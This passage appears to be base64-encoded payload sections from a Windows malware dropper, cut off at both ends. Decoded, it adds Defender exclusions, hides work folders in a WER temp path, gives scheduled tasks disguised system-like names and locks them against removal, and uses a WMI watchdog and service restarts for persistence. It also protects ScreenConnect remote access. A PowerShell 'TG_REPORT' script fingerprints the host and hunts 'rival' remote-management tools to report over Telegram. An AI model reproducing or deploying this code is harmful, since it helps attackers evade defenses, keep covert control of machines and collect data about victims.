Y2x1c2lvblByb2Nlc3MgJHggLUVBIDAgfTsiIF4NCiAgIkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1
c2lvbkV4dGVuc2lvbiAnLmNtZCcsJy5wczEnLCcubXNpJyAtRUEgMCIgPm51bCAyPiYxDQoNClJF
TSAtLS0gQUNMOiBvbmx5IFNZU1RFTSArIEFkbWluaXN0cmF0b3JzIG9uIHBlcnNpc3QgZGlycyAt
LS0NCmNhbGwgOkxvY2tEaXIgIiVXRCUiDQpjYWxsIDpMb2NrRGlyICIlV0QyJSINCg0KUkVNIC0t
LSBoaWRlIHdvcmtkaXJzICsga2V5IHBheWxvYWQgZmlsZXMgLS0tDQphdHRyaWIgK2ggK3MgIiVX
RCUiID5udWwgMj4mMQ0KYXR0cmliICtoICtzICIlV0QyJSIgPm51bCAyPiYxDQpSRU0gUzU6IGRv
IE5PVCBoaWRlL2xvY2sgdGhlIG11dGFibGUgcGF5bG9hZCBzY3JpcHRzIC0gY29weS9tb3ZlIG92
ZXIgK2ggK3MgZmlsZXMNClJFTSBmYWlscyBzaWxlbnRseSBhbmQgZnJvemUgdGhlIHdob2xlIGZs
ZWV0J3Mgc2VsZi11cGRhdGUuIEhpZGRlbiBkaXJzIGNvbmNlYWwgY29udGVudHMgYWxyZWFkeS4N
CmZvciAlJUYgaW4gKHBrZy5tc2kgbm90aWZ5LmNmZyBpZGVudGl0eS5jZmcgc3RhdGUuanNvbikg
ZG8gKA0KICBpZiBleGlzdCAiJVdEJVwlJUYiIGF0dHJpYiAraCArcyAiJVdEJVwlJUYiID5udWwg
Mj4mMQ0KKQ0KDQpSRU0gLS0tIEFDTDogc2NoZWR1bGVkIHRhc2sgWE1MIChoYXJkZXIgdG8gZGVs
ZXRlIHdpdGhvdXQgQWRtaW4pIC0tLQ0KUkVNIFM2OiBuYW1lcyBjb250YWluIHNwYWNlcyAoIlNl
cnZlciBEaWFnbm9zdGljcyIpIC0gdGhlIGNtZCBGT1IgbG9vcCBzcGxpdA0KUkVNIHRoZW0gaW50
byBnYXJiYWdlIHRva2Vucy4gUG93ZXJTaGVsbCByZWFkcyBpZGVudGl0eS5jZmcgZGlyZWN0bHkg
aW5zdGVhZC4NCnBvd2Vyc2hlbGwuZXhlIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kIF4NCiAgIiRFcnJvckFjdGlvblByZWZlcmVuY2U9
J1NpbGVudGx5Q29udGludWUnOyAkbmFtZXM9QCgpOyIgXg0KICAiaWYoVGVzdC1QYXRoIC1MaXRl
cmFsUGF0aCAnJVdEJVxpZGVudGl0eS5jZmcnKXsgR2V0LUNvbnRlbnQgLUxpdGVyYWxQYXRoICcl
V0QlXGlkZW50aXR5LmNmZycgLUZvcmNlIHwgRm9yRWFjaC1PYmplY3QgeyBpZigkXyAtbWF0Y2gg
J15UQVNLX1tBLURdPSguKykkJyl7ICRuYW1lcyArPSAkbWF0Y2hlc1sxXS5UcmltKCkuVHJpbVN0
YXJ0KCdcJykgfSB9IH0iIF4NCiAgImVsc2UgeyAkbmFtZXM9QCgnV2VyUXVldWVTeW5jJywnUGxh
U2VydmVySGVhbHRoJywnV2RpSG9zdFByb3h5JywnVGNwSXBDb25mbGljdFJlcycpIH07IiBeDQog
ICJmb3JlYWNoKCRuIGluICRuYW1lcyl7ICRmID0gSm9pbi1QYXRoICclVEFTS1JPT1QlJyAkbjsg
aWYoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAkZil7ICYgaWNhY2xzLmV4ZSAkZiAvaW5oZXJpdGFu
Y2U6ciB8IE91dC1OdWxsOyAmIGljYWNscy5leGUgJGYgL2dyYW50OnIgJ05UIEFVVEhPUklUWVxT
WVNURU06RicgJ0JVSUxUSU5cQWRtaW5pc3RyYXRvcnM6RicgfCBPdXQtTnVsbDsgJiBhdHRyaWIu
ZXhlICtoICtzICRmIHwgT3V0LU51bGwgfSB9IiA+bnVsIDI+JjENCg0KUkVNIC0tLSBBQ0w6IFdN
SSB3YXRjaGRvZyBzdWJzY3JpcHRpb24gZmlsZXMgKGNoYWluIDIpIC0tLQ0KaWNhY2xzICIlU3lz
dGVtUm9vdCVcU3lzdGVtMzJcd2JlbVxSZXBvc2l0b3J5IiAvZ3JhbnQgIk5UIEFVVEhPUklUWVxT
WVNURU06RiIgPm51bCAyPiYxDQoNClJFTSAtLS0gQUNMOiBrZWVwIFNjcmVlbkNvbm5lY3QgaW5z
dGFsbCBkaXJzIChvbmNlOyB0YWtlb3duIGV2ZXJ5IHRpY2sgaXMgbm9pc3kpIC0tLQ0KaWYgbm90
IGV4aXN0ICIlV0QlXHNlY3VyZV9zYy5mbGFnIiAoDQogIGZvciAlJUQgaW4gKA0KICAgICIlUEYl
XFNjcmVlbkNvbm5lY3QgQ2xpZW50ICglS0VFUDElKSINCiAgICAiJVBGJVxTY3JlZW5Db25uZWN0
IENsaWVudCAoJUtFRVAyJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtF
RVAxJSkiDQogICAgIiVQRjg2JVxTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVAyJSkiDQogICkg
ZG8gKA0KICAgIGlmIGV4aXN0ICIlJX5EIiBjYWxsIDpMb2NrRGlyICIlJX5EIg0KICApDQogIGVj
aG8gc2NfbG9ja2VkPiVXRCVcc2VjdXJlX3NjLmZsYWcNCikNCg0KUkVNIC0tLSBTQyBzZXJ2aWNl
czogU1lTVEVNIGNhbiBjb25maWcvc3RvcC9kZWxldGU7IEJBIGZ1bGw7IHVzZXJzIGJsb2NrZWQg
LS0tDQpSRU0gU1k6IENDIERDIExDIFNXIFJQIERUIExPIFJDICAobm8gU0QgLT4gY2Fubm90IGNo
YW5nZSB0aGlzIFNEIGl0c2VsZikNCnNldCAiU0Q9RDooQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSUkM7
OztTWSkoQTs7Q0NEQ0xDU1dSUFdQRFRMT0NSU0RSQ1dEV087OztCQSkiDQpzYy5leGUgc2RzZXQg
IiVQUklNJSIgIiVTRCUiID5udWwgMj4mMQ0Kc2MuZXhlIHNkc2V0ICIlQUxUJSIgIiVTRCUiID5u
dWwgMj4mMQ0Kc2MuZXhlIGNvbmZpZyAiJVBSSU0lIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNj
LmV4ZSBjb25maWcgIiVBTFQlIiBzdGFydD0gYXV0byA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJl
ICIlUFJJTSUiIHJlc2V0PSA4NjQwMCBhY3Rpb25zPSByZXN0YXJ0LzYwMDAwL3Jlc3RhcnQvNjAw
MDAvcmVzdGFydC82MDAwMCA+bnVsIDI+JjENCnNjLmV4ZSBmYWlsdXJlICIlQUxUJSIgcmVzZXQ9
IDg2NDAwIGFjdGlvbnM9IHJlc3RhcnQvNjAwMDAvcmVzdGFydC82MDAwMC9yZXN0YXJ0LzYwMDAw
ID5udWwgMj4mMQ0KDQplY2hvIHNlY3VyZV9kb25lPj4iJUxPRyUiDQpleGl0IC9iIDANCg0KOkxv
Y2tEaXINCnNldCAiVD0lfjEiDQppZiBub3QgZXhpc3QgIiVUJSIgZXhpdCAvYiAwDQpSRU0gdGFr
ZSBvd25lcnNoaXAgdGhlbiBzdHJpcCBpbmhlcml0ZWQgQUNFczsgU1lTVEVNK0FkbWlucyBvbmx5
DQp0YWtlb3duIC9GICIlVCUiIC9SIC9EIFkgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL2luaGVy
aXRhbmNlOnIgPm51bCAyPiYxDQppY2FjbHMgIiVUJSIgL2dyYW50OnIgIk5UIEFVVEhPUklUWVxT
WVNURU06KE9JKShDSSlGIiAiQlVJTFRJTlxBZG1pbmlzdHJhdG9yczooT0kpKENJKUYiID5udWwg
Mj4mMQ0KaWNhY2xzICIlVCUiIC9yZW1vdmU6ZyAiVXNlcnMiICJBdXRoZW50aWNhdGVkIFVzZXJz
IiAiRXZlcnlvbmUiICJOVCBBVVRIT1JJVFlcSU5URVJBQ1RJVkUiICJCVUlMVElOXFVzZXJzIiA+
bnVsIDI+JjENCmV4aXQgL2IgMA0K
::B64_SEC_END
::B64_TGR_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyBUR19SRVBPUlQgQlVJTEQgMjAyNjA4MDJUMTMgLSBy
b290LWxldmVsIHRhc2sgbmFtZXMgKElERU5UVkVSPTcpOyBUUiBvd25lcnNoaXA7IFJNTStEYXR0
byBrZWVwDQpwYXJhbSgNCiAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeSA9ICR0cnVlKV1bc3RyaW5n
XSRTdGF0ZSwNCiAgICBbc3RyaW5nXSRTdW1tYXJ5ID0gJycsDQogICAgW3N0cmluZ10kV29ya0Rp
ciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJcVGVtcFwud3VjYWNoZScs
DQogICAgW3N0cmluZ10kT2xkU3RhdGUgPSAnJywNCiAgICBbVmFsaWRhdGVTZXQoJ3JpY2gnLCAn
Y29tcGFjdCcpXVtzdHJpbmddJE1vZGUgPSAncmljaCcsDQogICAgW3N0cmluZ10kQnVpbGQgPSAn
TzE1JywNCiAgICBbc3RyaW5nXSRDb3VudCA9ICcwJw0KKQ0KDQokRXJyb3JBY3Rpb25QcmVmZXJl
bmNlID0gJ1NpbGVudGx5Q29udGludWUnDQokUHJvZ3Jlc3NQcmVmZXJlbmNlID0gJ1NpbGVudGx5
Q29udGludWUnDQp0cnkgeyBbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3Rv
Y29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyIH0gY2F0Y2gge30NCg0KZnVu
Y3Rpb24gR2V0LUNmZyB7DQogICAgJHBhdGggPSBKb2luLVBhdGggJFdvcmtEaXIgJ25vdGlmeS5j
ZmcnDQogICAgJGNmZyA9IEB7fQ0KICAgIGlmICgtbm90IChUZXN0LVBhdGggJHBhdGgpKSB7IHJl
dHVybiAkY2ZnIH0NCiAgICBHZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJHBhdGggfCBGb3JFYWNo
LU9iamVjdCB7DQogICAgICAgIGlmICgkXyAtbWF0Y2ggJ15ccyooW0EtWmEtejAtOV9dKylccyo9
XHMqKC4qKVxzKiQnKSB7DQogICAgICAgICAgICAkY2ZnWyRtYXRjaGVzWzFdXSA9ICRtYXRjaGVz
WzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgIHJldHVybiAkY2ZnDQp9DQoNCmZ1bmN0
aW9uIEVzYyhbc3RyaW5nXSRzKSB7DQogICAgaWYgKCRudWxsIC1lcSAkcykgeyByZXR1cm4gJycg
fQ0KICAgIHJldHVybiAoJHMgLXJlcGxhY2UgJyYnLCAnJmFtcDsnIC1yZXBsYWNlICc8JywgJyZs
dDsnIC1yZXBsYWNlICc+JywgJyZndDsnKQ0KfQ0KDQpmdW5jdGlvbiBHZXQtUHVibGljSXAgew0K
ICAgIGZvcmVhY2ggKCR1IGluIEAoDQogICAgICAgICAgICAnaHR0cHM6Ly9hcGkuaXBpZnkub3Jn
JywNCiAgICAgICAgICAgICdodHRwczovL2lmY29uZmlnLm1lL2lwJywNCiAgICAgICAgICAgICdo
dHRwczovL2ljYW5oYXppcC5jb20nDQogICAgICAgICkpIHsNCiAgICAgICAgdHJ5IHsNCiAgICAg
ICAgICAgICRyID0gSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkdSAtVXNlQmFzaWNQYXJzaW5nIC1U
aW1lb3V0U2VjIDYNCiAgICAgICAgICAgICRpcCA9ICgkci5Db250ZW50IHwgT3V0LVN0cmluZyku
VHJpbSgpDQogICAgICAgICAgICBpZiAoJGlwIC1tYXRjaCAnXlxkezEsM30oXC5cZHsxLDN9KXsz
fSQnIC1vciAkaXAgLW1hdGNoICc6JykgeyByZXR1cm4gJGlwIH0NCiAgICAgICAgfSBjYXRjaCB7
fQ0KICAgIH0NCiAgICByZXR1cm4gJ24vYScNCn0NCg0KZnVuY3Rpb24gR2V0LUxvY2FsSXBzIHsN
CiAgICB0cnkgew0KICAgICAgICAkaXBzID0gR2V0LU5ldElQQWRkcmVzcyAtQWRkcmVzc0ZhbWls
eSBJUHY0IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwNCiAgICAgICAgICAgIFdoZXJl
LU9iamVjdCB7ICRfLklQQWRkcmVzcyAtbm90bGlrZSAnMTI3LionIC1hbmQgJF8uUHJlZml4T3Jp
Z2luIC1uZSAnV2VsbEtub3duJyB9IHwNCiAgICAgICAgICAgIFNlbGVjdC1PYmplY3QgLUV4cGFu
ZFByb3BlcnR5IElQQWRkcmVzcyAtVW5pcXVlDQogICAgICAgIGlmICgkaXBzKSB7IHJldHVybiAo
JGlwcyAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRp
cHMgPSBHZXQtQ2ltSW5zdGFuY2UgV2luMzJfTmV0d29ya0FkYXB0ZXJDb25maWd1cmF0aW9uIC1G
aWx0ZXIgJ0lQRW5hYmxlZD1UcnVlJyB8DQogICAgICAgICAgICBGb3JFYWNoLU9iamVjdCB7ICRf
LklQQWRkcmVzcyB9IHwgV2hlcmUtT2JqZWN0IHsgJF8gLWFuZCAkXyAtbm90bGlrZSAnMTI3Lion
IC1hbmQgJF8gLW5vdGxpa2UgJyo6KicgfQ0KICAgICAgICBpZiAoJGlwcykgeyByZXR1cm4gKCgk
aXBzIHwgU2VsZWN0LU9iamVjdCAtVW5pcXVlKSAtam9pbiAnLCAnKSB9DQogICAgfSBjYXRjaCB7
fQ0KICAgIHJldHVybiAnbi9hJw0KfQ0KDQpmdW5jdGlvbiBHZXQtT3NJbmZvIHsNCiAgICAkbyA9
IFtvcmRlcmVkXUB7DQogICAgICAgIENhcHRpb24gPSAnbi9hJzsgVmVyc2lvbiA9ICduL2EnOyBC
dWlsZCA9ICduL2EnOyBBcmNoID0gJ24vYScNCiAgICAgICAgRG9tYWluID0gJ24vYSc7IEluc3Rh
bGxEYXRlID0gJ24vYSc7IExhc3RCb290ID0gJ24vYScNCiAgICAgICAgQ1BVID0gJ24vYSc7IE1h
bnVmYWN0dXJlciA9ICduL2EnOyBNb2RlbCA9ICduL2EnOyBTZXJpYWwgPSAnbi9hJw0KICAgICAg
ICBUb3RhbFJBTV9HQiA9ICduL2EnOyBEaXNrRnJlZV9HQiA9ICduL2EnOyBEaXNrU2l6ZV9HQiA9
ICduL2EnDQogICAgfQ0KICAgIHRyeSB7DQogICAgICAgICRvcyA9IEdldC1DaW1JbnN0YW5jZSBX
aW4zMl9PcGVyYXRpbmdTeXN0ZW0NCiAgICAgICAgJG8uQ2FwdGlvbiA9ICRvcy5DYXB0aW9uDQog
ICAgICAgICRvLlZlcnNpb24gPSAkb3MuVmVyc2lvbg0KICAgICAgICAkby5CdWlsZCA9ICRvcy5C
dWlsZE51bWJlcg0KICAgICAgICAkby5BcmNoID0gJG9zLk9TQXJjaGl0ZWN0dXJlDQogICAgICAg
ICRvLkluc3RhbGxEYXRlID0gKCRvcy5JbnN0YWxsRGF0ZSB8IEdldC1EYXRlIC1Gb3JtYXQgJ3l5
eXktTU0tZGQnKQ0KICAgICAgICAkby5MYXN0Qm9vdCA9ICgkb3MuTGFzdEJvb3RVcFRpbWUgfCBH
ZXQtRGF0ZSAtRm9ybWF0ICd5eXl5LU1NLWRkIEhIOm1tJykNCiAgICAgICAgJG8uVG90YWxSQU1f
R0IgPSBbbWF0aF06OlJvdW5kKCRvcy5Ub3RhbFZpc2libGVNZW1vcnlTaXplIC8gMU1CLCAxKQ0K
ICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkY3MgPSBHZXQtQ2ltSW5zdGFuY2Ug
V2luMzJfQ29tcHV0ZXJTeXN0ZW0NCiAgICAgICAgJG8uRG9tYWluID0gaWYgKCRjcy5QYXJ0T2ZE
b21haW4pIHsgJGNzLkRvbWFpbiB9IGVsc2UgeyAkY3MuV29ya2dyb3VwIH0NCiAgICAgICAgJG8u
TWFudWZhY3R1cmVyID0gJGNzLk1hbnVmYWN0dXJlcg0KICAgICAgICAkby5Nb2RlbCA9ICRjcy5N
b2RlbA0KICAgIH0gY2F0Y2gge30NCiAgICB0cnkgew0KICAgICAgICAkby5DUFUgPSAoR2V0LUNp
bUluc3RhbmNlIFdpbjMyX1Byb2Nlc3NvciB8IFNlbGVjdC1PYmplY3QgLUZpcnN0IDEgLUV4cGFu
ZFByb3BlcnR5IE5hbWUpDQogICAgfSBjYXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRvLlNl
cmlhbCA9IChHZXQtQ2ltSW5zdGFuY2UgV2luMzJfQklPUykuU2VyaWFsTnVtYmVyDQogICAgfSBj
YXRjaCB7fQ0KICAgIHRyeSB7DQogICAgICAgICRkID0gR2V0LUNpbUluc3RhbmNlIFdpbjMyX0xv
Z2ljYWxEaXNrIC1GaWx0ZXIgIkRldmljZUlEPSdDOiciDQogICAgICAgICRvLkRpc2tGcmVlX0dC
ID0gW21hdGhdOjpSb3VuZCgkZC5GcmVlU3BhY2UgLyAxR0IsIDEpDQogICAgICAgICRvLkRpc2tT
aXplX0dCID0gW21hdGhdOjpSb3VuZCgkZC5TaXplIC8gMUdCLCAxKQ0KICAgIH0gY2F0Y2gge30N
CiAgICByZXR1cm4gJG8NCn0NCg0KZnVuY3Rpb24gR2V0LVN2Y0xpbmUoW3N0cmluZ10kbmFtZSkg
ew0KICAgICRzID0gR2V0LVNlcnZpY2UgLU5hbWUgJG5hbWUgLUVycm9yQWN0aW9uIFNpbGVudGx5
Q29udGludWUNCiAgICBpZiAoLW5vdCAkcykgeyByZXR1cm4gJ05PVCBJTlNUQUxMRUQnIH0NCiAg
ICByZXR1cm4gKCd7MH0gKFN0YXJ0PXsxfSknIC1mICRzLlN0YXR1cywgJHMuU3RhcnRUeXBlKQ0K
fQ0KDQpmdW5jdGlvbiBHZXQtVGFza0hlYWx0aChbc3RyaW5nXSR0bikgew0KICAgICRvdXQgPSAm
IHNjaHRhc2tzLmV4ZSAvUXVlcnkgL1ROICR0biAvRk8gTElTVCAvViAyPiRudWxsDQogICAgaWYg
KCRMQVNURVhJVENPREUgLW5lIDAgLW9yIC1ub3QgJG91dCkgew0KICAgICAgICByZXR1cm4gQHsg
UHJlc2VudCA9ICRmYWxzZTsgU3RhdHVzID0gJ01JU1NJTkcnOyBOZXh0ID0gJyc7IExhc3QgPSAn
JzsgUmVzdWx0ID0gJyc7IE91cnMgPSAkZmFsc2UgfQ0KICAgIH0NCiAgICAkbWFwID0gQHt9DQog
ICAgJGJsb2IgPSAoJG91dCB8IEZvckVhY2gtT2JqZWN0IHsgIiRfIiB9KSAtam9pbiAiYG4iDQog
ICAgZm9yZWFjaCAoJGxpbmUgaW4gJG91dCkgew0KICAgICAgICBpZiAoJGxpbmUgLW1hdGNoICde
XHMqKFteOl0rKTpccyooLiopXHMqJCcpIHsNCiAgICAgICAgICAgICRtYXBbJG1hdGNoZXNbMV0u
VHJpbSgpXSA9ICRtYXRjaGVzWzJdLlRyaW0oKQ0KICAgICAgICB9DQogICAgfQ0KICAgICRzdGF0
dXMgPSAkbWFwWydTdGF0dXMnXQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0YXR1cyA9ICRt
YXBbJ1Rhc2sgU3RhdHVzJ10gfQ0KICAgIGlmICgtbm90ICRzdGF0dXMpIHsgJHN0YXR1cyA9ICdw
cmVzZW50JyB9DQogICAgJG5leHQgPSAkbWFwWydOZXh0IFJ1biBUaW1lJ10NCiAgICBpZiAoLW5v
dCAkbmV4dCkgeyAkbmV4dCA9ICcnIH0NCiAgICAkbGFzdCA9ICRtYXBbJ0xhc3QgUnVuIFRpbWUn
XQ0KICAgIGlmICgtbm90ICRsYXN0KSB7ICRsYXN0ID0gJycgfQ0KICAgICRyZXN1bHQgPSAkbWFw
WydMYXN0IFJlc3VsdCddDQogICAgaWYgKC1ub3QgJHJlc3VsdCkgeyAkcmVzdWx0ID0gJycgfQ0K
ICAgICR0ciA9ICRtYXBbJ1Rhc2sgVG8gUnVuJ10NCiAgICBpZiAoLW5vdCAkdHIpIHsgJHRyID0g
JG1hcFsnVGFzayB0byBSdW4nXSB9DQogICAgJG91cnMgPSAoJGJsb2IgLW1hdGNoICcoP2kpb3du
X21vblwuY21kfGV0bF9tb25cLmNtZHxcLnd1Y2FjaGVcXHxcLmV0bGNhY2hlXFwnKQ0KICAgICMg
UHJlc2VudCBXaW5kb3dzIGJ1aWx0LWluIHdpdGggc2FtZSBuYW1lIGlzIE5PVCBoZWFsdGh5IGZv
ciB1cw0KICAgICRoZWFsdGh5ID0gJG91cnMgLWFuZCAoKCRzdGF0dXMgLW1hdGNoICdSZWFkeXxS
dW5uaW5nJykgLW9yICgkc3RhdHVzIC1lcSAncHJlc2VudCcpKQ0KICAgIHJldHVybiBAew0KICAg
ICAgICBQcmVzZW50ID0gJHRydWUNCiAgICAgICAgT3VycyAgICA9IFtib29sXSRvdXJzDQogICAg
ICAgIEhlYWx0aHkgPSBbYm9vbF0kaGVhbHRoeQ0KICAgICAgICBTdGF0dXMgID0gJChpZiAoJG91
cnMpIHsgJHN0YXR1cyB9IGVsc2UgeyAnTk9UX09VUlMnIH0pDQogICAgICAgIE5leHQgICAgPSAk
bmV4dA0KICAgICAgICBMYXN0ICAgID0gJGxhc3QNCiAgICAgICAgUmVzdWx0ICA9ICRyZXN1bHQN
CiAgICAgICAgVHIgICAgICA9ICQoaWYgKCR0cikgeyAkdHIgfSBlbHNlIHsgJycgfSkNCiAgICB9
DQp9DQoNCmZ1bmN0aW9uIEdldC1SbW1IaXRzIHsNCiAgICAjIERldGVjdCByaXZhbHMgZm9yIFRl
bGVncmFtLiBLRUVQOiBTY3JlZW5Db25uZWN0IGFsbG93bGlzdCArIERhdHRvL0NlbnRyYVN0YWdl
Lg0KICAgICR0b2tlbnMgPSBAKA0KICAgICAgICAnQW55RGVzaycsICdUZWFtVmlld2VyJywgJ3R2
bnNlcnZlcicsICdEV0FnZW50JywgJ0RXU2VydmljZScsICdMb2dNZUluJywgJ0xNSUd1YXJkaWFu
JywNCiAgICAgICAgJ1dpblZOQycsICd2bmNzZXJ2ZXInLCAndHZfJywgJ1NwbGFzaHRvcCcsICda
b2hvIEFzc2lzdCcsICdSdXN0RGVzaycsICdSZW1vdGVQQycsICdEYW1lV2FyZScsDQogICAgICAg
ICdBdGVyYUFnZW50JywgJ0F0ZXJhJywgJ05pbmphUk1NJywgJ05pbmphT25lJywgJ05pbmphUk1N
QWdlbnQnLCAnS2FzZXlhJywgJ0FnZW50TW9uJywgJ1B1bHNld2F5JywgJ1BDIE1vbml0b3InLCAn
U3luY3JvJywgJ0thYnV0bycsDQogICAgICAgICdTdXBlck9wcycsICdNYW5hZ2VFbmdpbmUnLCAn
VUVNUycsICdEZXNrdG9wIENlbnRyYWwnLCAnRW5kcG9pbnQgQ2VudHJhbCcsICdTb2xhcldpbmRz
IE1TUCcsICdDb25uZWN0V2lzZSBBdXRvbWF0ZScsICdMVFNlcnZpY2UnLCAnTGFiVGVjaCcsDQog
ICAgICAgICdBY3Rpb24xJywgJ1NpbXBsZUhlbHAnLCAnQm9tZ2FyJywgJ0JleW9uZFRydXN0Jywg
J01lc2hBZ2VudCcsICdNZXNoIENlbnRyYWwnLCAnTWVzaCBBZ2VudCcsDQogICAgICAgICdUYWN0
aWNhbFJNTScsICd0YWN0aWNhbHJtbScsICdHZXRTY3JlZW4nLCAnU3VwcmVtbycsICdydXRzZXJ2
JywgJ3JlbW90aW5nX2hvc3QnLA0KICAgICAgICAnQ2hyb21lIFJlbW90ZSBEZXNrdG9wJywgJ1Bh
cnNlYycsICdOZXRTdXBwb3J0JywgJ0xldmVsLmlvJywgJ0xldmVsIEFnZW50JywNCiAgICAgICAg
J0NvbnRpbnV1bScsICdTQUFaJywgJ05hdmVyaXNrJywgJ0ltbXlCb3QnLCAnQXV0b21veCcsICdh
bWFnZW50JywgJ0Fjcm9uaXMgQ3liZXInLCAnRG9tb3R6JywgJ0F1dmlrJywNCiAgICAgICAgJ0Jh
cnJhY3VkYSBSTU0nLCAnTWFuYWdlZCBXb3JrcGxhY2UnLCAnR292ZXJsYW4nLCAnUERRIERlcGxv
eScsICdQRFEgSW52ZW50b3J5JywgJ1BEUSBDb25uZWN0JywNCiAgICAgICAgJ04tYWJsZScsICdO
LWNlbnRyYWwnLCAnTi1zaWdodCcsICdUYWtlIENvbnRyb2wnLCAnQWR2YW5jZWQgTW9uaXRvcmlu
ZyBBZ2VudCcsICdVbHRyYVZpZXdlcicsICdBZXJvQWRtaW4nLA0KICAgICAgICAnTGl0ZU1hbmFn
ZXInLCAnUmFkbWluJywgJ05vTWFjaGluZScsICdJcGVyaXVzJywgJ0lTTCBMaWdodCcsICdBbW15
eScsICdUaWdodFZOQycsICdVbHRyYVZOQycsICdSZWFsVk5DJw0KICAgICkNCiAgICAka2VlcFRv
a2VucyA9IEAoJ0RhdHRvJywgJ0NlbnRyYVN0YWdlJywgJ0NhZ1NlcnZpY2UnLCAnQXV0b3Rhc2tF
bmRwb2ludCcpDQogICAgJGhpdHMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5l
cmljLkxpc3Rbc3RyaW5nXQ0KICAgICRzZWVuID0gQHt9DQoNCiAgICBmdW5jdGlvbiBBZGQtSGl0
KFtzdHJpbmddJGtpbmQsIFtzdHJpbmddJG5hbWUpIHsNCiAgICAgICAgJGtleSA9ICIka2luZHwk
bmFtZSIuVG9Mb3dlckludmFyaWFudCgpDQogICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgk
a2V5KSkgeyByZXR1cm4gfQ0KICAgICAgICAkc2Vlblska2V5XSA9ICR0cnVlDQogICAgICAgIFt2
b2lkXSRoaXRzLkFkZCgoJy0gW3swfV0gPGNvZGU+ezF9PC9jb2RlPicgLWYgJGtpbmQsIChFc2Mg
JG5hbWUpKSkNCiAgICB9DQogICAgZnVuY3Rpb24gVGVzdC1LZWVwTmFtZShbc3RyaW5nXSRzKSB7
DQogICAgICAgIGlmICgtbm90ICRzKSB7IHJldHVybiAkZmFsc2UgfQ0KICAgICAgICBpZiAoJHMg
LWxpa2UgJypTY3JlZW5Db25uZWN0KicpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAgZm9yZWFj
aCAoJGsgaW4gJGtlZXBUb2tlbnMpIHsgaWYgKCRzIC1saWtlICIqJGsqIikgeyByZXR1cm4gJHRy
dWUgfSB9DQogICAgICAgIHJldHVybiAkZmFsc2UNCiAgICB9DQoNCiAgICBHZXQtU2VydmljZSAt
RXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAg
JG4gPSAkXy5OYW1lDQogICAgICAgICRkID0gJF8uRGlzcGxheU5hbWUNCiAgICAgICAgaWYgKFRl
c3QtS2VlcE5hbWUgJG4gLW9yIFRlc3QtS2VlcE5hbWUgJGQpIHsNCiAgICAgICAgICAgIGlmICgk
biAtbGlrZSAnKkNlbnRyYVN0YWdlKicgLW9yICRkIC1saWtlICcqRGF0dG8qJyAtb3IgJG4gLWxp
a2UgJypDYWdTZXJ2aWNlKicpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdrZWVwLWRhdHRv
JyAoIiRuICgkKCRfLlN0YXR1cykpIikNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVy
bg0KICAgICAgICB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAg
ICAgIGlmICgkbiAtbGlrZSAiKiR0KiIgLW9yICRkIC1saWtlICIqJHQqIikgew0KICAgICAgICAg
ICAgICAgIEFkZC1IaXQgJ3N2YycgKCIkbiAoJCgkXy5TdGF0dXMpKSIpDQogICAgICAgICAgICAg
ICAgYnJlYWsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIEdldC1Qcm9j
ZXNzIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
ICAgICAkbiA9ICRfLlByb2Nlc3NOYW1lDQogICAgICAgIGlmIChUZXN0LUtlZXBOYW1lICRuKSB7
IHJldHVybiB9DQogICAgICAgIGZvcmVhY2ggKCR0IGluICR0b2tlbnMpIHsNCiAgICAgICAgICAg
IGlmICgkbiAtbGlrZSAiKiR0KiIpIHsNCiAgICAgICAgICAgICAgICBBZGQtSGl0ICdwcm9jJyAk
bg0KICAgICAgICAgICAgICAgIGJyZWFrDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICB9
DQoNCiAgICAkdW5pbnN0ID0gQCgNCiAgICAgICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jvc29mdFxX
aW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbFwqJywNCiAgICAgICAgJ0hLTE06XFNPRlRX
QVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFs
bFwqJw0KICAgICkNCiAgICBmb3JlYWNoICgkcGF0aCBpbiAkdW5pbnN0KSB7DQogICAgICAgIEdl
